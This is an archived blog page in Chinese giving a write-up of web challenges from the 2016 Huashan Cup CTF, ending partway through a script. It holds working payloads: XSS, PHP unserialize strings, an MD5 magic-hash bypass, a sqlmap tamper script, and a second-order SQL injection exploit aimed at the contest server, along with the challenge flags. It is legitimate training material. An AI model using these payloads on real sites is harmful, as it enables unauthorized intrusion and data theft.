<!DOCTYPE html>

<html>
<head>
<meta charset="utf-8"/>
<title>2016-中国·西安 华山杯 Writeup-SeeSea | Swings'Blog|浮生若梦|CTFer|Binary|Python</title>
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"/>
<meta content="和金总，JH,Pcat,Po叔叔还有Crz27大神耍了一波华山杯 可惜的是。。。安卓呀。。。。" name="description"/>
<meta content="article" property="og:type"/>
<meta content="2016-中国·西安 华山杯 Writeup-SeeSea" property="og:title"/>
<meta content="http://bestwing.me/2016/09/11/2016-Hs-ctf-SeeSea-writeup/index.html" property="og:url"/>
<meta content="Swings'Blog|浮生若梦|CTFer|Binary|Python" property="og:site_name"/>
<meta content="和金总，JH,Pcat,Po叔叔还有Crz27大神耍了一波华山杯 可惜的是。。。安卓呀。。。。" property="og:description"/>
<meta content="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/61851063.jpg" property="og:image"/>
<meta content="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/93429080.jpg" property="og:image"/>
<meta content="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/35641631.jpg" property="og:image"/>
<meta content="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/25806101.jpg" property="og:image"/>
<meta content="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/63995380.jpg" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:08:21%20" property="og:image"/>
<meta content="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/66687170.jpg" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:11:22%20" property="og:image"/>
<meta content="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/78532530.jpg" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:16:03%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:23:24%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:26:18%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:28:03%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:31:46%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:33:51%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:37:08%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:39:04%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:40:05%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:41:33%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:43:39%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:44:48%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/08:55:34%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/08:59:11%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/08:59:40%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:00:01%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:10:48%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:13:38%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:15:19%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:21:11%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:22:02%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:25:54%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:36:03%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:42:55%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:45:42%20" property="og:image"/>
<meta content="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:52:33%20" property="og:image"/>
<meta content="http://7xi72v.com1.z0.glb.clouddn.com/16-9-11/99289129.jpg" property="og:image"/>
<meta content="2016-12-14T15:57:23.568Z" property="og:updated_time"/>
<meta content="summary" name="twitter:card"/>
<meta content="2016-中国·西安 华山杯 Writeup-SeeSea" name="twitter:title"/>
<meta content="和金总，JH,Pcat,Po叔叔还有Crz27大神耍了一波华山杯 可惜的是。。。安卓呀。。。。" name="twitter:description"/>
<meta content="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/61851063.jpg" name="twitter:image"/>
<link href="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/atom.xml" rel="alternative" title="Swings'Blog|浮生若梦|CTFer|Binary|Python" type="application/atom+xml"/>
<link href="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/98028288-file_1488275496708_10f1d.jpg" rel="icon"/>
<link href="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/animate.min.css" rel="stylesheet"/>
<link href="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/style.css" rel="stylesheet"/>
<link href="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/font-awesome.min.css" rel="stylesheet"/>
<link href="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/apple-touch-icon.png" rel="apple-touch-icon"/>
<link href="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/jquery.fancybox.css" rel="stylesheet"/>
<!-- 加载特效 -->
<script src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/pace.js"></script>
<link href="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/pace-theme-flash.css" rel="stylesheet">
<script>
      var yiliaConfig = {
          fancybox: true,
          animate: true,
          isHome: false,
          isPost: true,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
</link></head>
<body>
<div id="container">
<div class="left-col">
<div class="overlay"></div>
<div class="intrude-less">
<header class="inner" id="header">
<a class="profilepic" href="/">
<img class="js-avatar" lazy-src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/180526%20"/>
</a>
<hgroup>
<h1 class="header-author"><a href="/">Swing|浮生若梦</a></h1>
</hgroup>
<p class="header-subtitle">努力是为了 站在万人中央 成为别人的光</p>
<div class="switch-btn" id="switch-btn">
<div class="icon">
<div class="icon-ctn">
<div class="icon-wrap icon-house" data-idx="0">
<div class="birdhouse"></div>
<div class="birdhouse_holes"></div>
</div>
<div class="icon-wrap icon-ribbon hide" data-idx="1">
<div class="ribbon"></div>
</div>
<div class="icon-wrap icon-link hide" data-idx="2">
<div class="loopback_l"></div>
<div class="loopback_r"></div>
</div>
<div class="icon-wrap icon-me hide" data-idx="3">
<div class="user"></div>
<div class="shoulder"></div>
</div>
</div>
</div>
<div class="tips-box hide">
<div class="tips-arrow"></div>
<ul class="tips-inner">
<li>菜单</li>
<li>标签</li>
<li>友情链接</li>
<li>关于我</li>
</ul>
</div>
</div>
<div class="switch-area" id="switch-area">
<div class="switch-wrap">
<section class="switch-part switch-part1">
<nav class="header-menu">
<ul>
<li><a href="http://bestwing.me">博客首页</a></li>
<li><a href="/archives/">文章归档</a></li>
<li><a href="/about">留言打卡</a></li>
<li><a href="/CTF-Study">学习导航</a></li>
<li><a href="/PWNABLE">PWNABLE</a></li>
</ul>
</nav>
<nav class="header-nav">
<ul class="social">
<a class="fl mail" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" target="_blank" title="mail">mail</a>
<a class="fl github" href="https://github.com/WinMin" target="_blank" title="github">github</a>
<a class="fl zhihu" href="https://www.zhihu.com/people/swing-57-29/activities" target="_blank" title="zhihu">zhihu</a>
<a class="fl twitter" href="https://twitter.com/bestswngs" target="_blank" title="twitter">twitter</a>
<a class="fl rss" href="/atom.xml" target="_blank" title="rss">rss</a>
</ul>
</nav>
</section>
<section class="switch-part switch-part2">
<div class="widget tagcloud" id="js-tagcloud">
<a href="/tags/0CTF/" style="font-size: 10px;">0CTF</a> <a href="/tags/360春秋杯/" style="font-size: 10px;">360春秋杯</a> <a href="/tags/Bin/" style="font-size: 10px;">Bin</a> <a href="/tags/Book/" style="font-size: 10px;">Book</a> <a href="/tags/CCTF/" style="font-size: 10px;">CCTF</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 12px;">Crypto</a> <a href="/tags/DEFCON/" style="font-size: 10px;">DEFCON</a> <a href="/tags/ELF/" style="font-size: 10px;">ELF</a> <a href="/tags/Git/" style="font-size: 10px;">Git</a> <a href="/tags/Hexo/" style="font-size: 18px;">Hexo</a> <a href="/tags/John/" style="font-size: 10px;">John</a> <a href="/tags/Kcon/" style="font-size: 10px;">Kcon</a> <a href="/tags/Linux-kernel/" style="font-size: 16px;">Linux-kernel</a> <a href="/tags/Markdown/" style="font-size: 10px;">Markdown</a> <a href="/tags/Misc/" style="font-size: 10px;">Misc</a> <a href="/tags/NJCTF/" style="font-size: 10px;">NJCTF</a> <a href="/tags/NUCA/" style="font-size: 12px;">NUCA</a> <a href="/tags/PCTF/" style="font-size: 10px;">PCTF</a> <a href="/tags/Pwn/" style="font-size: 20px;">Pwn</a> <a href="/tags/Pwntools/" style="font-size: 10px;">Pwntools</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/Reverse/" style="font-size: 18px;">Reverse</a> <a href="/tags/SSTF/" style="font-size: 10px;">SSTF</a> <a href="/tags/SUCTF/" style="font-size: 10px;">SUCTF</a> <a href="/tags/Think/" style="font-size: 14px;">Think</a> <a href="/tags/Tools/" style="font-size: 10px;">Tools</a> <a href="/tags/VPN/" style="font-size: 10px;">VPN</a> <a href="/tags/Web/" style="font-size: 12px;">Web</a> <a href="/tags/WiFi/" style="font-size: 10px;">WiFi</a> <a href="/tags/Writeup/" style="font-size: 14px;">Writeup</a> <a href="/tags/angry/" style="font-size: 10px;">angry</a> <a href="/tags/exploit/" style="font-size: 10px;">exploit</a> <a href="/tags/i春秋-百度杯/" style="font-size: 14px;">i春秋-百度杯</a> <a href="/tags/i春秋-腾讯30强/" style="font-size: 12px;">i春秋-腾讯30强</a> <a href="/tags/kernel/" style="font-size: 10px;">kernel</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a> <a href="/tags/wooyun/" style="font-size: 10px;">wooyun</a> <a href="/tags/上海省赛/" style="font-size: 10px;">上海省赛</a> <a href="/tags/华山杯CTF/" style="font-size: 10px;">华山杯CTF</a> <a href="/tags/科学上网/" style="font-size: 10px;">科学上网</a> <a href="/tags/陕西省赛/" style="font-size: 10px;">陕西省赛</a>
</div>
</section>
<section class="switch-part switch-part3">
<div id="js-friends">
<a class="main-nav-link switch-friends-link" href="http://ring3.xyz/" target="_blank">Yllen</a>
<a class="main-nav-link switch-friends-link" href="http://mxny.org/" target="_blank">麦香浓郁</a>
<a class="main-nav-link switch-friends-link" href="http://whereisk0shl.top/" target="_blank">K0sh1</a>
<a class="main-nav-link switch-friends-link" href="http://www.ycjcl.cc/" target="_blank">信鑫</a>
<a class="main-nav-link switch-friends-link" href="http://bystudent.com/" target="_blank">ByStundet表哥</a>
<a class="main-nav-link switch-friends-link" href="https://www.jarviswang.me/" target="_blank">汪神_Jarvis</a>
<a class="main-nav-link switch-friends-link" href="http://sh3ll.me/" target="_blank">Chu</a>
<a class="main-nav-link switch-friends-link" href="https://www.hackfun.org/" target="_blank">4ido10n</a>
<a class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy" target="_blank">L3m0n</a>
<a class="main-nav-link switch-friends-link" href="http://o0xmuhe.me/" target="_blank">muhe</a>
<a class="main-nav-link switch-friends-link" href="http://blog.nuptzj.cn/" target="_blank">_画船听雨</a>
<a class="main-nav-link switch-friends-link" href="http://www.virzz.com/index.html" target="_blank">Virink</a>
<a class="main-nav-link switch-friends-link" href="http://www.sqlsec.com/" target="_blank">国光</a>
<a class="main-nav-link switch-friends-link" href="http://www.bodkin.ren/" target="_blank">老锥</a>
<a class="main-nav-link switch-friends-link" href="http://www.cizel.cn/" target="_blank">C1zel</a>
<a class="main-nav-link switch-friends-link" href="http://1phan.cc" target="_blank">1phan</a>
<a class="main-nav-link switch-friends-link" href="https://www.liuil.top/" target="_blank">liuil</a>
<a class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/Ox9A82/" target="_blank">Ox9A82</a>
<a class="main-nav-link switch-friends-link" href="http://burnegg.com/" target="_blank">burnegg</a>
<a class="main-nav-link switch-friends-link" href="https://jwrsec.cn/" target="_blank">jwr-sec</a>
<a class="main-nav-link switch-friends-link" href="http://sudalover.cn/" target="_blank">苏打</a>
<a class="main-nav-link switch-friends-link" href="http://blog.binklac.com" target="_blank">VeroFess</a>
<a class="main-nav-link switch-friends-link" href="http://www.bendawang.site/" target="_blank">bendawang</a>
<a class="main-nav-link switch-friends-link" href="http://weeklyalgo.codes/" target="_blank">hook</a>
</div>
</section>
<section class="switch-part switch-part4">
<div id="js-aboutme">我想一年后再来写这个 2016年9月4日</div>
</section>
</div>
</div>
</header>
</div>
</div>
<div class="mid-col">
<nav id="mobile-nav">
<div class="overlay">
<div class="slider-trigger"></div>
<h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Swing|浮生若梦</a></h1>
</div>
<div class="intrude-less">
<header class="inner" id="header">
<a class="profilepic" href="/">
<img class="js-avatar" lazy-src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/180526%20"/>
</a>
<hgroup>
<h1 class="header-author"><a href="/" title="回到主页">Swing|浮生若梦</a></h1>
</hgroup>
<p class="header-subtitle">努力是为了 站在万人中央 成为别人的光</p>
<nav class="header-menu">
<ul>
<li><a href="http://bestwing.me">博客首页</a></li>
<li><a href="/archives/">文章归档</a></li>
<li><a href="/about">留言打卡</a></li>
<li><a href="/CTF-Study">学习导航</a></li>
<li><a href="/PWNABLE">PWNABLE</a></li>
<div class="clearfix"></div>
</ul>
</nav>
<nav class="header-nav">
<div class="social">
<a class="mail" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" target="_blank" title="mail">mail</a>
<a class="github" href="https://github.com/WinMin" target="_blank" title="github">github</a>
<a class="zhihu" href="https://www.zhihu.com/people/swing-57-29/activities" target="_blank" title="zhihu">zhihu</a>
<a class="twitter" href="https://twitter.com/bestswngs" target="_blank" title="twitter">twitter</a>
<a class="rss" href="/atom.xml" target="_blank" title="rss">rss</a>
</div>
</nav>
</header>
</div>
</nav>
<div class="body-wrap"><article class="article article-type-post" id="post-2016-Hs-ctf-SeeSea-writeup" itemprop="blogPost" itemscope="">
<div class="article-meta">
<a class="article-date" href="/2016/09/11/2016-Hs-ctf-SeeSea-writeup/">
<time datetime="2016-09-11T02:15:38.000Z" itemprop="datePublished">2016-09-11</time>
</a>
</div>
<div class="article-inner">
<input class="isFancy" type="hidden"/>
<header class="article-header">
<h1 class="article-title" itemprop="name">
      2016-中国·西安 华山杯 Writeup-SeeSea
    </h1>
</header>
<div class="article-info article-info-post">
<div class="article-category tagcloud">
<a class="article-category-link" href="/categories/CTF/">CTF</a>
</div>
<div class="article-tag tagcloud">
<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/华山杯CTF/">华山杯CTF</a></li></ul>
</div>
<div class="clearfix"></div>
</div>
<div class="article-entry" itemprop="articleBody">
<p>&lt;–more–&gt;<br/><a href="https://yunpan.cn/ckyrKxHJDPAIN" rel="external" target="_blank">题目分享</a>（提取码：bbaf）</p>
<h1 id="Web"><a class="headerlink" href="#Web" title="Web"></a>Web</h1><h2 id="签到-10"><a class="headerlink" href="#签到-10" title="签到(10)"></a>签到(10)</h2><blockquote>
<p>扫码回复 <code>hs_ctf</code>拿flag,  套路题。<br/><code>flag_Xd{hSh_ctf:WelcomeTo2016XiDian&amp;HumenHS}</code></p>
</blockquote>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/61851063.jpg"/></p>
<h2 id="打不过-50"><a class="headerlink" href="#打不过-50" title="打不过~(50)"></a>打不过~(50)</h2><blockquote>
<p>打不过绕道走~ <a href="http://huashan.xdsec.cn/ctf_hs_00b.php" rel="external" target="_blank">http://huashan.xdsec.cn/ctf_hs_00b.php</a></p>
</blockquote>
<p>直接将submit按钮改成可点击，然后抓包，发现<code>str</code>值为<code>OGM0MzU1NTc3MTdhMTQ4NTc4ZmQ4MjJhYWVmOTYwNzk=</code>，拿出来解base64，然后再解一道md5，得到是<code>1931b</code>，然后提交<code>Password=1931b</code>，得flag:<code>flag_Xd{hSh_ctf:XD_aA@lvmM}</code></p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/93429080.jpg"/></p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/35641631.jpg"/></p>
<h2 id="系统管理-100"><a class="headerlink" href="#系统管理-100" title="系统管理(100)"></a>系统管理(100)</h2><blockquote>
<p><a href="http://huashan.xdsec.cn/xt" rel="external" target="_blank">http://huashan.xdsec.cn/xt</a>  账户:admin  密码:admin  请登陆<br/>首次发包，返回部分源码，是<code>username</code>的md5值为0，所以令<code>username</code>值为<code>QNKCDZO</code>。</p>
</blockquote>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/25806101.jpg"/></p>
<p>然后返回了<code>user.php</code>，然后对<code>user.php</code>进行发包。看到了新的源码，是一个反序列化漏洞。然后构造<code>password=a:2:{s:4:"user";b:1;s:4:"pass";b:1;}</code>，向<code>index.php</code>发包。得到flag:<code>flag_Xd{hSh_ctf:kidhvuensl^$}</code>。</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/63995380.jpg"/></p>
<h2 id="简单js-100"><a class="headerlink" href="#简单js-100" title="简单js(100)"></a>简单js(100)</h2><blockquote>
<p>来道js前菜，热身一下吧~  <a href="http://huashan.xdsec.cn/jdjs" rel="external" target="_blank">http://huashan.xdsec.cn/jdjs</a></p>
</blockquote>
<p>进去后不能右键源码，其实各种查看源码的法子，例如火狐f12打开firebug，然后源码里就是简单的js而已</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/010821%20"/></p>
<p>在控制台里运行即可得到key值，submit得到flag。或者干脆直接onclick=”return check();”去掉</p>
<h2 id="弹弹弹！-150"><a class="headerlink" href="#弹弹弹！-150" title="弹弹弹！(150)"></a>弹弹弹！(150)</h2><blockquote>
<p>弹出鱼尾纹！~  <a href="http://huashan.xdsec.cn/ctf_hs_00a.php" rel="external" target="_blank">http://huashan.xdsec.cn/ctf_hs_00a.php</a></p>
</blockquote>
<p>很简单的xss，过滤不严，<br/><code>&lt;BODY ONLOAD=alert('XSS')&gt;</code></p>
<p>xss，直接构造payload<code>&lt;BODY%2BONLOAD%253Dalert%2528%2527XSS%2527%2529&gt;</code></p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/66687170.jpg"/></p>
<h2 id="233-150"><a class="headerlink" href="#233-150" title="233(150)"></a>233(150)</h2><blockquote>
<p>少年，老套路，你都懂得~  <a href="http://huashan.xdsec.cn/233/" rel="external" target="_blank">http://huashan.xdsec.cn/233/</a></p>
</blockquote>
<p>查看源代码 能看到是JSfuck编码 解码 </p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/011122%20"/></p>
<p>得到加密后的一句话木马<br/><strong>┼攠數畣整爠煥敵瑳∨䁥祳ぴ㍧≴┩&gt;</strong><br/>解密得到一句话密码<code>e@syt0g3t</code><br/>得到 <code>flag_Xd{hSh_ctf:e@syt0g3t}</code></p>
<h2 id="无间道-200"><a class="headerlink" href="#无间道-200" title="无间道(200)"></a>无间道(200)</h2><blockquote>
<p>无间道：放你的人来我这？~ <a href="http://huashan.xdsec.cn/upload/index.php" rel="external" target="_blank">http://huashan.xdsec.cn/upload/index.php</a></p>
</blockquote>
<p>利用“php很烦人”那题得到index.php源码，flag就在其中</p>
<p>正确解法：<br/>一道上传截断题目,过程不多说。直接fuzz %80~%00中间的字符,即可上传成功,得到返回的flag。由于上传删除文件的过程有延时,可能存在竞争上传问题。</p>
<h2 id="Mory-try"><a class="headerlink" href="#Mory-try" title="Mory try"></a>Mory try</h2><p>没做出来<br/>看了师傅们的wp<br/>过程大概是<br/><strong>role参数里是两次base64编码，测试后可以注入。使用sqlmap的random user-agent绕过一下，并编写两次base64的tamper：</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># Copyright (c) 7 team  All rights reserved</span></div><div class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</div><div class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> urlencode</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line">__priority__ = PRIORITY.LOW</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload)</span>:</span></div><div class="line">    retVal = payload</div><div class="line">    retVal = base64.b64encode(retVal)</div><div class="line">    retVal = base64.b64encode(retVal)</div><div class="line">    retVal = urllib.quote(retVal)</div><div class="line">    <span class="keyword">return</span> retVal</div></pre></td></tr></table></figure>
<p>然后就能得到flag<br/><code>flag_xd{hsh_ctf:sql_succeed!}</code></p>
<h2 id="php很烦人-200"><a class="headerlink" href="#php很烦人-200" title="php很烦人(200)"></a>php很烦人(200)</h2><blockquote>
<p>但php仍然是世界上最好的语言   <a href="http://huashan.xdsec.cn/php/" rel="external" target="_blank">http://huashan.xdsec.cn/php/</a><br/>发包，看到源码。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;!--</div><div class="line">$user = $_GET[<span class="string">"user"</span>];</div><div class="line">$file = $_GET[<span class="string">"file"</span>];</div><div class="line">$pass = $_GET[<span class="string">"pass"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>)){</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></div><div class="line">}<span class="keyword">else</span>{</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</div><div class="line">}</div><div class="line"> --&gt;</div></pre></td></tr></table></figure>
<p>是让传三个参数<code>user,file,pass</code>，然后先构造<code>user=php://input</code>,post值<code>the user is admin</code>。<code>file=class.php</code>，<code>pass=O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}</code>反序列化去读取<code>f1a9.php</code>。直接出<code>flag</code>。</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/78532530.jpg"/></p>
<h2 id="三秒钟记忆-300"><a class="headerlink" href="#三秒钟记忆-300" title="三秒钟记忆(300)"></a>三秒钟记忆(300)</h2><blockquote>
<p>三秒钟记忆</p>
</blockquote>
<p>最近只有三秒钟记忆，忘记的事情总是要一遍一遍的找回来…<br/><a href="http://huashan.xdsec.cn/pic" rel="external" target="_blank">http://huashan.xdsec.cn/pic</a></p>
<p>这题也没做出来</p>
<p>也是看了师傅们的wp<br/><strong><code>二次注入，触发点在密码找回那边。exp：</code></strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="comment">#by mathias@xdsec</span></div><div class="line"><span class="comment"># Copyright (c) 7 team  All rights reserved</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">regist</span><span class="params">(usr)</span>:</span></div><div class="line">    flag=<span class="keyword">False</span></div><div class="line">    url=<span class="string">"http://huashan.*****.cn/pic/index.php?page=login"</span></div><div class="line">    payload={<span class="string">'name'</span>:usr,<span class="string">'pass'</span>:<span class="string">'123456'</span>,<span class="string">'email'</span>:<span class="string">'123456'</span>,<span class="string">'register'</span>:<span class="string">'%E6%B3%A8%E5%86%8C'</span>}</div><div class="line">    r=requests.post(url,data=payload)</div><div class="line">    txt=r.text.encode(<span class="string">'utf-8'</span>)</div><div class="line">    <span class="keyword">if</span> <span class="string">'Duplicate'</span> <span class="keyword">in</span> txt <span class="keyword">or</span> len(txt)==<span class="number">503</span>:</div><div class="line">        flag=<span class="keyword">True</span></div><div class="line">    <span class="keyword">return</span> flag</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span><span class="params">(usr)</span>:</span></div><div class="line">    flag=<span class="keyword">False</span></div><div class="line">    url=<span class="string">"http://huashan.*****.cn/pic/index.php?page=login"</span></div><div class="line">    payload={<span class="string">'name'</span>:usr,<span class="string">'reset'</span>:<span class="string">'%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81'</span>}</div><div class="line">    r=requests.post(url,data=payload)</div><div class="line">    <span class="keyword">if</span> len(r.text)==<span class="number">460</span>:</div><div class="line">        flag=<span class="keyword">True</span></div><div class="line">    <span class="keyword">return</span> flag</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line"></div><div class="line">    url=<span class="string">"http://huashan.*****.cn/pic/index.php?page=login"</span></div><div class="line">    flag=<span class="keyword">False</span></div><div class="line">    user=str(random.randint(<span class="number">10000000000</span>,<span class="number">99999999999</span>))</div><div class="line">    p=user+<span class="string">'\' and (select ascii(substr(flag,1,1)) from flag)&gt;50#'</span> </div><div class="line">    flag=regist(user)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flag:</div><div class="line">        <span class="keyword">print</span> <span class="string">"regist "</span>+user+<span class="string">" error"</span></div><div class="line">        os._exit()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"regist "</span>+user+<span class="string">" success"</span></div><div class="line"></div><div class="line">    flag=regist(p)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flag:</div><div class="line">        <span class="keyword">print</span> <span class="string">"regist "</span>+p+<span class="string">" error"</span></div><div class="line">        os._exit()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"regist "</span>+p+<span class="string">" success,now reset password"</span></div><div class="line"></div><div class="line">    flag=reset(p)</div><div class="line">    <span class="keyword">if</span> flag:</div><div class="line">        <span class="keyword">print</span> <span class="string">"Reset success,now inject"</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"reset "</span>+p+<span class="string">" error"</span></div><div class="line">        os._exit()</div><div class="line"></div><div class="line">    url=<span class="string">"http://huashan.*****.cn/pic/index.php?page=login"</span></div><div class="line">    payload={<span class="string">'name'</span>:user,<span class="string">'pass'</span>:<span 